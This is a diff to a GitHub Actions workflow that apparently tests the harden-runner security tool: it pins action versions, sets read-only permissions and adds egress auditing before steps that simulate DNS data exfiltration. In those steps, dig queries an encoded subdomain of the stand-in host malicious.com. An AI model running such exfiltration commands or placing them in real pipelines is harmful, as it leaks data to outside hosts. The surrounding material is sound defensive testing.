@@ -1,13 +1,16 @@
 name: Multiple Jobs
 on:
   workflow_dispatch:
+permissions:
+  contents: read
+
 jobs:
   job1:
     name: Job1
     runs-on: ubuntu-latest
     steps:
       - name: Harden Runner
-        uses: step-security/harden-runner@int
+        uses: step-security/harden-runner@3dd2222992cdb2c249f43fc314e8f95b8e6f26d0 # int
         with:
           egress-policy: block
           allowed-endpoints: >
@@ -47,6 +50,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       # DNS Data Exfiltration
+      - name: Harden Runner
+        uses: step-security/harden-runner@55d479fb1c5bcad5a4f9099a5d9f37c8857b2845 # v2.4.1
+        with:
+          egress-policy: audit
+
       - name: DNS Data Exfiltration
         run: |
           dig wI25mMRFgqmHdg6Se7F3qcRPg6mHxTXgoroAcQcu0ukreCZVj3ccl1OE4nhT.malicious.com
@@ -79,7 +87,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Harden Runner
-        uses: step-security/harden-runner@int
+        uses: step-security/harden-runner@3dd2222992cdb2c249f43fc314e8f95b8e6f26d0 # int
         with:
           egress-policy: audit
 
@@ -116,6 +124,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       # DNS Data Exfiltration
+      - name: Harden Runner
+        uses: step-security/harden-runner@55d479fb1c5bcad5a4f9099a5d9f37c8857b2845 # v2.4.1
+        with:
+          egress-policy: audit
+
       - name: DNS Data Exfiltration
         run: |
           dig wI25mMRFgqmHdg6Se7F3qcRPg6mHxTXgoroAcQcu0ukreCZVj3ccl1OE4nhT.malicious.com
